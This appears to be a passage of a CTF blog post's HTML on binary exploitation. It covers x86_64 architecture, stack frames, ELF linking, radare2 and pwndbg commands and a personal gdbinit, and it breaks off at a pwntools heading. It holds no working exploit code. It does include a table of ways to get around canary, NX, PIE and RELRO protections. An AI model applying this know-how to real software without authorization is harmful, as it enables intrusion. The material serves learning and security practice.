+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Binary Exploitation - Architecture, Reversing, Exploitation &amp; Shellcode | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Binary Exploitation - Architecture, Reversing, Exploitation & Shellcode
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-05-03 15:58:57 / Modified: 15:58:58" itemprop="dateCreated datePublished" datetime="2026-05-03T15:58:57+08:00">2026-05-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/ctf/ctf-03-binary/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="ctf/ctf-03-binary/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="x86_64-architecture-stack">x86_64 Architecture &amp; Stack</h1>
+<h2 id="byte-order-packing">Byte Order &amp; Packing</h2>
+<ul>
+<li>Most Linux CTF binaries on x86/x86_64 are
+<strong>little-endian</strong>: the least significant byte is stored at
+the lowest address.</li>
+<li><code>0x40123a</code> packed as 64-bit little-endian becomes
+<code>3a 12 40 00 00 00 00 00</code>.</li>
+<li>This matters for partial overwrites: overflowing byte-by-byte
+overwrites the low bytes of a saved pointer first.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p8(<span class="number">0x41</span>)                 <span class="comment"># b&#x27;A&#x27;</span></span><br><span class="line">p16(<span class="number">0x1234</span>)              <span class="comment"># b&#x27;4\x12&#x27;</span></span><br><span class="line">p32(<span class="number">0xdeadbeef</span>)          <span class="comment"># b&#x27;\xef\xbe\xad\xde&#x27;</span></span><br><span class="line">p64(<span class="number">0x40123a</span>)            <span class="comment"># b&#x27;:\x12@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="registers">Registers</h2>
+<ul>
+<li><code>word</code> = 2 bytes, <code>dword</code> = 4 bytes,
+<code>qword</code> = 8 bytes</li>
+<li><code>RBP</code>: frame/base pointer, <code>RSP</code>: stack
+pointer, <code>RIP</code>: instruction pointer.</li>
+<li>Writing to 32-bit registers (e.g., <code>EAX</code>) automatically
+clears the upper 32 bits of the corresponding 64-bit register
+(<code>RAX</code>). <code>xor EAX, EAX</code> is equivalent to
+<code>xor RAX, RAX</code> but has a shorter encoding.</li>
+</ul>
+<p>Memory access sizes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov [RAX], bl    ; 1 byte</span><br><span class="line">mov [RAX], bx    ; 2 bytes (word)</span><br><span class="line">mov [RAX], ebx   ; 4 bytes (dword)</span><br><span class="line">mov [RAX], rbx   ; 8 bytes (qword)</span><br></pre></td></tr></table></figure>
+<h2 id="calling-convention-sysv-abi">Calling Convention (SysV ABI)</h2>
+<ul>
+<li><strong>Arguments</strong>: <code>RDI</code>, <code>RSI</code>,
+<code>RDX</code>, <code>RCX</code>, <code>R8</code>,
+<code>R9</code>.</li>
+<li><strong>Return Value</strong>: <code>RAX</code> (with
+<code>RDX</code> potentially holding high bits or extra data).</li>
+<li><strong>Syscall arguments</strong>: <code>RDI</code>,
+<code>RSI</code>, <code>RDX</code>, <code>R10</code>, <code>R8</code>,
+<code>R9</code>; syscall number in <code>RAX</code>.</li>
+<li><code>RCX</code> and <code>R11</code> are clobbered by
+<code>syscall</code>.</li>
+<li><strong>x86_32</strong>: Arguments are passed via the
+<code>stack</code> in right-to-left order.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man syscall</span><br><span class="line">grep -R <span class="string">&quot;__NR_execve&quot;</span> /usr/include/asm* /usr/include/x86_64-linux-gnu/asm* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h2 id="rex.w-prefix-0x48">REX.W Prefix (0x48)</h2>
+<p>The REX prefix range is <code>0x40</code>-<code>0x4F</code>
+(<code>0100 WRXB</code>), used to extend x86 instructions to 64-bit:</p>
+<ul>
+<li><strong>W</strong>: Set to 1 for 64-bit operations.</li>
+<li><strong>R, X, B</strong>: Extension for register addressing
+(R8-R15).</li>
+</ul>
+<p><code>mov RDI, RSP</code> requires a REX prefix with W=1 →
+<code>0100 1000</code> = <strong><code>0x48</code></strong>.</p>
+<h2 id="stack-frame-layout">Stack Frame Layout</h2>
+<ul>
+<li><strong><code>RBP</code> (Register)</strong>: Points to the bottom
+of the current function <code>stack</code> frame. Local variables are
+accessed relative to it (e.g., <code>[RBP - 0x10]</code>).</li>
+<li><strong><code>saved RBP</code> (Stack Data)</strong>: A backup of
+the caller's <code>RBP</code>, used to restore the previous frame upon
+return.</li>
+</ul>
+<h3 id="prologue-epilogue">Prologue &amp; Epilogue</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; Prologue (Entering Function B)</span><br><span class="line">push RBP        ; Save Caller A&#x27;s RBP -&gt; becomes saved RBP</span><br><span class="line">mov RBP, RSP    ; Establish B&#x27;s stack frame</span><br><span class="line"></span><br><span class="line">; Epilogue (Exiting Function B) - Equivalent to &#x27;leave; ret&#x27;</span><br><span class="line">mov RSP, RBP    ; Clean up local variables</span><br><span class="line">pop RBP         ; Restore Caller A&#x27;s RBP</span><br><span class="line">ret             ; Return to Caller A</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">High Addr  +-------------------------------+</span><br><span class="line">           |  Caller&#x27;s Stack Frame         |</span><br><span class="line">           +-------------------------------+</span><br><span class="line">           |  return address               |  ← call instruction auto-push</span><br><span class="line">           +-------------------------------+  ← reg RBP points here</span><br><span class="line">           |  saved RBP                    |  ← stores caller&#x27;s RBP</span><br><span class="line">           +-------------------------------+</span><br><span class="line">           |  local variables              |  ← accessed via [RBP - offset]</span><br><span class="line">           +-------------------------------+  ← reg RSP (stack top)</span><br><span class="line">Low Addr   |  (unused)                     |</span><br><span class="line">           +-------------------------------+</span><br></pre></td></tr></table></figure>
+<h1 id="memory-management">Memory Management</h1>
+<h2 id="segments">Segments</h2>
+<ul>
+<li><strong>.text</strong>: Executable code.</li>
+<li><strong>.data</strong>: Initialized global writable data.</li>
+<li><strong>.rodata</strong>: Read-only data (strings, constants).</li>
+<li><strong>.bss</strong>: Uninitialized global writable data.</li>
+<li><strong>stack</strong>: Local variables and function metadata.</li>
+<li><strong>heap</strong>: Dynamically allocated memory via
+<code>malloc()</code>.</li>
+</ul>
+<p>Viewing memory maps:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/&lt;pid&gt;/maps</span><br></pre></td></tr></table></figure>
+<h2 id="von-neumann-architecture">Von Neumann Architecture</h2>
+<p>In memory, bytes can represent either code or data; the CPU
+distinguishes them solely based on <code>RIP</code>. Bytes pointed to by
+<code>RIP</code> are executed as opcodes, while others accessed via
+pointers are treated as data.</p>
+<h2 id="security-mitigations">Security Mitigations</h2>
+<table>
+<colgroup>
+<col style="width: 10%" />
+<col style="width: 89%" />
+</colgroup>
+<thead>
+<tr>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>NX</strong></td>
+<td>No-eXecute bit. Hardware-level page attribute marking memory pages
+as non-executable.</td>
+</tr>
+<tr>
+<td><strong>W^X</strong></td>
+<td>Write XOR Execute. Memory is either writable or executable, never
+both simultaneously.</td>
+</tr>
+<tr>
+<td><strong>ASLR</strong></td>
+<td>Address Space Layout Randomization. Randomizes memory layout at
+runtime.</td>
+</tr>
+<tr>
+<td><strong>PIE</strong></td>
+<td>Position Independent Executable. Randomizes the <code>binary</code>
+base address.</td>
+</tr>
+<tr>
+<td><strong>canary</strong></td>
+<td>Stack protector. Detects <code>buffer overflow</code> by checking a
+secret value before returning.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="checksec-reading">Checksec Reading</h3>
+<table>
+<colgroup>
+<col style="width: 13%" />
+<col style="width: 86%" />
+</colgroup>
+<thead>
+<tr>
+<th>Mitigation</th>
+<th>Exploitation impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>No Canary</strong></td>
+<td>Saved <code>RIP</code> overwrite is usually direct once the offset
+is known.</td>
+</tr>
+<tr>
+<td><strong>Canary</strong></td>
+<td>Need leak, byte brute-force, non-return control flow, or write
+primitive that skips the canary.</td>
+</tr>
+<tr>
+<td><strong>NX disabled</strong></td>
+<td>Stack/heap shellcode is viable if control can jump to it.</td>
+</tr>
+<tr>
+<td><strong>NX enabled</strong></td>
+<td>Prefer ROP, ret2libc, <code>mprotect</code>, <code>mmap</code>,
+JOP/COP, or existing executable regions.</td>
+</tr>
+<tr>
+<td><strong>No PIE</strong></td>
+<td>Binary code addresses are fixed, e.g. <code>win()</code> / gadgets /
+PLT have stable absolute addresses.</td>
+</tr>
+<tr>
+<td><strong>PIE enabled</strong></td>
+<td>Need code pointer leak, PIE base recovery, or partial
+overwrite/brute force.</td>
+</tr>
+<tr>
+<td><strong>No RELRO</strong></td>
+<td>GOT is writable and can be overwritten before/after resolution.</td>
+</tr>
+<tr>
+<td><strong>Partial RELRO</strong></td>
+<td><code>.got.plt</code> remains writable; lazy binding is still
+present.</td>
+</tr>
+<tr>
+<td><strong>Full RELRO</strong></td>
+<td>GOT is read-only after startup; GOT overwrite is blocked.</td>
+</tr>
+<tr>
+<td><strong>SHSTK</strong></td>
+<td>Intel CET shadow stack verifies returns; classic <code>ret</code>
+overwrite/ROP may fail.</td>
+</tr>
+<tr>
+<td><strong>IBT</strong></td>
+<td>Intel CET indirect branch tracking requires indirect-call/jump
+targets to begin with <code>endbr64</code>.</td>
+</tr>
+</tbody>
+</table>
+<p><code>checksec</code> hints at the easiest path, but it is not a
+proof. A binary with executable stack may still be protected by
+<code>SHSTK</code>/<code>IBT</code>, input filters, unstable stack
+addresses, or non-return exits.</p>
+<h2 id="elf-dynamic-linking">ELF &amp; Dynamic Linking</h2>
+<ul>
+<li><strong>ELF header</strong>: architecture, entry point, program
+headers.</li>
+<li><strong>Program headers</strong>: loader view; maps segments into
+memory (<code>LOAD</code>, <code>GNU_STACK</code>,
+<code>GNU_RELRO</code>).</li>
+<li><strong>Section headers</strong>: linker/debugger view; useful for
+<code>.text</code>, <code>.plt</code>, <code>.got</code>,
+<code>.bss</code>, symbols.</li>
+<li><strong>PLT</strong>: stubs in the binary used to call imported
+functions.</li>
+<li><strong>GOT</strong>: table of resolved function/data
+addresses.</li>
+<li><strong>Lazy binding</strong>: first PLT call jumps into the dynamic
+resolver, which writes the real libc address into GOT.</li>
+<li><strong>RELRO</strong>: controls whether relocation/GOT pages become
+read-only after relocation.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file ./chall</span><br><span class="line">readelf -h ./chall</span><br><span class="line">readelf -l ./chall</span><br><span class="line">readelf -S ./chall</span><br><span class="line">readelf -s ./chall</span><br><span class="line">readelf -r ./chall       <span class="comment"># relocations / GOT targets</span></span><br><span class="line">objdump -d ./chall | less</span><br><span class="line">objdump -R ./chall       <span class="comment"># dynamic relocations</span></span><br><span class="line">strings -a ./chall | less</span><br></pre></td></tr></table></figure>
+<h3 id="address-translation">Address Translation</h3>
+<ul>
+<li><strong>VA</strong>: virtual address used at runtime.</li>
+<li><strong>RVA / offset inside module</strong>:
+<code>runtime_addr - module_base</code>.</li>
+<li><strong>File offset</strong>: byte offset in the ELF file; not
+always equal to RVA because segments have mapping alignment.</li>
+</ul>
+<p>In a non-PIE ELF, <code>.text</code> often loads near
+<code>0x400000</code>. In a PIE ELF, disassemblers may show offsets such
+as <code>0x1d08</code>; runtime address is
+<code>pie_base + 0x1d08</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">piebase</span><br><span class="line">breakrva 0x1d08</span><br><span class="line">vmmap</span><br><span class="line">xinfo 0x555555555d08</span><br></pre></td></tr></table></figure>
+<h1 id="binary-analysis-tools">Binary Analysis &amp; Tools</h1>
+<h2 id="cli-tools">CLI Tools</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file hello        <span class="comment"># Identify arch, linking, stripped status</span></span><br><span class="line">strip hello       <span class="comment"># Remove symbols</span></span><br><span class="line">nm -a hello       <span class="comment"># Show symbol tables</span></span><br><span class="line">checksec --file=hello</span><br><span class="line">ltrace ./hello    <span class="comment"># Trace library calls</span></span><br><span class="line">strace ./hello    <span class="comment"># Trace system calls</span></span><br><span class="line">strings -a hello  <span class="comment"># Extract printable strings</span></span><br><span class="line">readelf -a hello  <span class="comment"># ELF metadata</span></span><br><span class="line">objdump -d hello  <span class="comment"># Disassembly</span></span><br></pre></td></tr></table></figure>
+<h2 id="reverse-engineering-workflow">Reverse Engineering Workflow</h2>
+<ol type="1">
+<li><strong>Identify</strong>: <code>file</code>, <code>checksec</code>,
+<code>readelf -h</code>, <code>rabin2 -I</code>.</li>
+<li><strong>Triage strings/imports</strong>: <code>strings</code>,
+<code>rabin2 -zz</code>, <code>rabin2 -i</code>, IDA/Ghidra strings
+window.</li>
+<li><strong>Find control points</strong>: <code>main</code>, parser
+loop, comparison branches, <code>win</code>, <code>system</code>,
+<code>/bin/sh</code>, <code>open/read/write</code>, <code>strcmp</code>,
+<code>memcmp</code>, <code>printf</code>.</li>
+<li><strong>Recover input format</strong>: header magic, version,
+command/directive fields, length fields, endian, per-record size.</li>
+<li><strong>Trace data flow</strong>: where user bytes land, how size is
+computed, where pointers are stored, whether data is copied, validated,
+freed, or printed.</li>
+<li><strong>Convert checks into constraints</strong>: compare constants,
+printable-byte filters, checksums, jump tables, index math, bounds
+checks.</li>
+<li><strong>Exploit mapping</strong>: choose leak/write/control-flow
+primitive that matches mitigations.</li>
+</ol>
+<p>Useful questions while reversing:</p>
+<ul>
+<li>Is the binary stripped? If not, start with symbols. If stripped,
+start with imports, strings, and cross-references.</li>
+<li>Does the program return normally, call <code>exit</code>, or loop
+forever? Return-address hijacking only triggers on a return path.</li>
+<li>Does a length check use signed or unsigned comparison? Which width:
+<code>byte</code>, <code>word</code>, <code>dword</code>, or
+<code>qword</code>?</li>
+<li>Are there hidden repeat/backdoor paths that re-enter the vulnerable
+function before canary validation?</li>
+<li>Does a parser use a switch/jump table? Can an out-of-range or
+special directive reach extra code?</li>
+</ul>
+<h2 id="radare2-quick-reference">radare2 Quick Reference</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rax2 0x28                         <span class="comment"># Hex/decimal conversion</span></span><br><span class="line">rabin2 -I ./chall                 <span class="comment"># Binary info</span></span><br><span class="line">rabin2 -z ./chall                 <span class="comment"># Data-section strings</span></span><br><span class="line">rabin2 -zz ./chall                <span class="comment"># All strings</span></span><br><span class="line">rabin2 -i ./chall                 <span class="comment"># Imports</span></span><br><span class="line">rabin2 -e ./chall                 <span class="comment"># Entry points</span></span><br><span class="line">r2 -A ./chall                     <span class="comment"># Analyze and open</span></span><br><span class="line">r2 -w ./chall                     <span class="comment"># Open writable for patching</span></span><br><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ main&quot;</span> ./chall <span class="comment"># Non-interactive disassembly</span></span><br></pre></td></tr></table></figure>
+<p>Inside <code>r2</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">aaa             # Full analysis</span><br><span class="line">afl             # List functions</span><br><span class="line">s main          # Seek to symbol/address</span><br><span class="line">s -             # Seek back</span><br><span class="line">pdf             # Print current function</span><br><span class="line">pdf @ sym.main  # Print a function</span><br><span class="line">pd 20           # Print 20 instructions</span><br><span class="line">px 64           # Hexdump</span><br><span class="line">iz              # Strings in data sections</span><br><span class="line">izz             # Strings in whole binary</span><br><span class="line">axt @ addr      # Cross-references to address</span><br><span class="line">axf @ addr      # Cross-references from address</span><br><span class="line">VV              # Visual graph</span><br><span class="line">wx 909090       # Patch raw bytes (requires -w)</span><br><span class="line">wa nop          # Assemble and patch instruction (requires -w)</span><br></pre></td></tr></table></figure>
+<h2 id="patching-notes">Patching Notes</h2>
+<ul>
+<li>Patching data is safer than patching code when the target check
+compares constants or file-format bytes.</li>
+<li>For code patches, inspect instruction length first; replacing a
+longer conditional branch with shorter bytes needs padding with
+<code>nop</code>.</li>
+<li>In non-PIE ELF, runtime VA is often near file mapping base
+<code>0x400000</code>; still convert VA to file offset using program
+headers or tooling instead of guessing.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a x86 -b 64 <span class="string">&quot;nop&quot;</span></span><br><span class="line">rasm2 -a x86 -b 64 -d <span class="string">&quot;90&quot;</span></span><br><span class="line">objdump -d -Mintel ./chall | less</span><br></pre></td></tr></table></figure>
+<h2 id="pwndbg">Pwndbg</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg /path/to/binary    <span class="comment"># Launch</span></span><br><span class="line">start                     <span class="comment"># Break at main (fails if no main symbol)</span></span><br><span class="line">starti                    <span class="comment"># Break at first instruction (initialization code)</span></span><br><span class="line">entry                     <span class="comment"># Break at ELF entry point</span></span><br><span class="line">info <span class="built_in">functions</span>            <span class="comment"># List all analyzed function symbols</span></span><br><span class="line">info frame                <span class="comment"># Show current stack frame</span></span><br><span class="line">piebase                   <span class="comment"># Show PIE base address</span></span><br><span class="line">vmmap                     <span class="comment"># Show memory layout (r-x, rw-, etc.)</span></span><br><span class="line">breakrva 0x19e3           <span class="comment"># Break at Relative Virtual Address (useful for PIE)</span></span><br><span class="line">stack                     <span class="comment"># Show stack</span></span><br><span class="line">canary                    <span class="comment"># Print and find canaries on the stack</span></span><br><span class="line">context &lt;section&gt;         <span class="comment"># Show specific context window</span></span><br><span class="line">checksec                  <span class="comment"># Check for security features (NX, ASLR, PIE, Canary)</span></span><br><span class="line">cyclic 100                <span class="comment"># Generate 100-byte De Bruijn sequence</span></span><br><span class="line">cyclic -l 0x6161616c      <span class="comment"># Find overflow offset using crash address</span></span><br><span class="line">retaddr                   <span class="comment"># Highlight return addresses in the current stack frame</span></span><br><span class="line">rop                       <span class="comment"># Simple ROP Gadget search</span></span><br><span class="line">got                       <span class="comment"># Show GOT state (resolved vs unresolved)</span></span><br><span class="line">plt                       <span class="comment"># View Procedure Linkage Table</span></span><br><span class="line">heap                      <span class="comment"># Overview of all heap chunks and their status</span></span><br><span class="line">bins                      <span class="comment"># View free lists (fastbins, unsorted, small, large, tcache)</span></span><br><span class="line">arena                     <span class="comment"># View detailed structure of the main arena (malloc_state)</span></span><br><span class="line"></span><br><span class="line">p <span class="variable">$rsp</span>                    <span class="comment"># Show current stack pointer</span></span><br><span class="line">disass main               <span class="comment"># Disassemble &#x27;main&#x27; function</span></span><br><span class="line"><span class="built_in">break</span> *main+123           <span class="comment"># Breakpoint at main+123</span></span><br></pre></td></tr></table></figure>
+<table>
+<colgroup>
+<col style="width: 14%" />
+<col style="width: 85%" />
+</colgroup>
+<thead>
+<tr>
+<th>Category</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stepping</td>
+<td><code>n</code> (step over), <code>s</code> (step into),
+<code>fin</code> (finish), <code>c</code> (continue)</td>
+</tr>
+<tr>
+<td>Breakpoints</td>
+<td><code>b *main+123</code>, <code>b &lt;symbol&gt;</code></td>
+</tr>
+<tr>
+<td>Memory</td>
+<td><code>x/11s &lt;addr&gt;</code>,
+<code>hexdump &lt;addr&gt; 44</code>,
+<code>tele &lt;addr&gt;</code></td>
+</tr>
+<tr>
+<td>Info</td>
+<td><code>context</code>, <code>vmmap</code>,
+<code>xinfo &lt;addr&gt;</code>, <code>checksec</code></td>
+</tr>
+</tbody>
+</table>
+<p>my <code>~/.gdbinit</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/share/pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span> save on</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line"></span><br><span class="line"><span class="comment"># may be useless</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$mybase1</span> = 0x0000555555554000</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$mybase</span> = 0x7ffff7ffc000</span><br><span class="line"></span><br><span class="line">python</span><br><span class="line">import os</span><br><span class="line">import atexit</span><br><span class="line">import pwndbg</span><br><span class="line">from pwndbg.commands.context import contextoutput</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;TMUX&#x27;</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">    created_panes = []</span><br><span class="line"></span><br><span class="line">    def create_pane(split_cmd):</span><br><span class="line">        output = os.popen(split_cmd).<span class="built_in">read</span>().strip()</span><br><span class="line">        <span class="keyword">if</span> not output: <span class="built_in">return</span> None, None</span><br><span class="line">        pane_id, <span class="built_in">tty</span> = output.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        created_panes.append(pane_id)</span><br><span class="line">        <span class="built_in">return</span> pane_id, <span class="built_in">tty</span></span><br><span class="line"></span><br><span class="line">    p_disasm_id, p_disasm_tty = create_pane(<span class="string">&#x27;tmux split-window -vb -P -F &quot;#&#123;pane_id&#125;:#&#123;pane_tty&#125;&quot; -l 75% -d &quot;cat -&quot;&#x27;</span>)</span><br><span class="line">    p_stack_id, p_stack_tty = create_pane(f<span class="string">&#x27;tmux split-window -v -P -F &quot;#&#123;&#123;pane_id&#125;&#125;:#&#123;&#123;pane_tty&#125;&#125;&quot; -l 40% -t &#123;p_disasm_id&#125; -d &quot;cat -&quot;&#x27;</span>)</span><br><span class="line">    p_bt_id, p_bt_tty = create_pane(<span class="string">&#x27;tmux split-window -h -P -F &quot;#&#123;pane_id&#125;:#&#123;pane_tty&#125;&quot; -t -1 -l 30% -d &quot;cat -&quot;&#x27;</span>)</span><br><span class="line">    p_regs_id, p_regs_tty = create_pane(f<span class="string">&#x27;tmux split-window -h -P -F &quot;#&#123;&#123;pane_id&#125;&#125;:#&#123;&#123;pane_tty&#125;&#125;&quot; -t &#123;p_stack_id&#125; -l 30% -d &quot;cat -&quot;&#x27;</span>)</span><br><span class="line">    p_ipy_id, p_ipy_tty = create_pane(<span class="string">&#x27;tmux split-window -h -P -F &quot;#&#123;pane_id&#125;:#&#123;pane_tty&#125;&quot; -l 30% -d &quot;ipython&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p_disasm_tty: contextoutput(<span class="string">&quot;disasm&quot;</span>, p_disasm_tty, True, <span class="string">&#x27;top&#x27;</span>, False)</span><br><span class="line">    <span class="keyword">if</span> p_stack_tty:  contextoutput(<span class="string">&quot;stack&quot;</span>, p_stack_tty, True, <span class="string">&#x27;top&#x27;</span>, False)</span><br><span class="line">    <span class="keyword">if</span> p_bt_tty:     contextoutput(<span class="string">&quot;backtrace&quot;</span>, p_bt_tty, True, <span class="string">&#x27;top&#x27;</span>, False)</span><br><span class="line">    <span class="keyword">if</span> p_regs_tty:   contextoutput(<span class="string">&quot;regs&quot;</span>, p_regs_tty, True, <span class="string">&#x27;top&#x27;</span>, False)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p_stack_tty: contextoutput(<span class="string">&quot;legend&quot;</span>, p_stack_tty, True)</span><br><span class="line">    <span class="keyword">if</span> p_regs_tty:  contextoutput(<span class="string">&quot;expressions&quot;</span>, p_regs_tty, True, <span class="string">&#x27;top&#x27;</span>, False)</span><br><span class="line"></span><br><span class="line">    def cleanup_panes():</span><br><span class="line">        <span class="keyword">for</span> pid <span class="keyword">in</span> created_panes:</span><br><span class="line">            os.system(f<span class="string">&quot;tmux kill-pane -t &#123;pid&#125; &gt;/dev/null 2&gt;&amp;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    atexit.register(cleanup_panes)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[\033[33m*\033[0m] Not running inside TMUX. Standard pwndbg output will be used.&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwndbg.config.context_disasm_lines.value = 25</span><br><span class="line">pwndbg.config.context_stack_lines.value = 18</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<h2 id="pwntools">pwntools</h2>
